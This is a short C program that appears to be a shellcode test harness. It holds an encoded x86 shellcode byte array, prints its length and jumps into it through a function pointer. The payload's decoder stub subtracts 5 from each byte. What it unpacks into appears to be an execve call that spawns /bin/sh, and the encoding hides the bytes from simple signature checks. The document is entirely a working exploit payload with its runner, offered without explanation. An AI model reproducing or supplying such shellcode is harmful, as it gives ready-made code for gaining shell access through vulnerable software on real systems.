#include<stdio.h>
#include<string.h>

unsigned char code[] = "\xeb\x16\x5e\x31\xc9\xb1\x19\x31\xdb\xb3\x05\x31\xc0\x8a\x06\x28\xd8\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xe5\xff\xff\xff\x36\xc5\x55\x6d\x34\x34\x78\x6d\x6d\x34\x67\x6e\x73\x8e\xe8\x55\x8e\xe7\x58\x8e\xe6\xb5\x10\xd2\x85";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
	return 0;
}

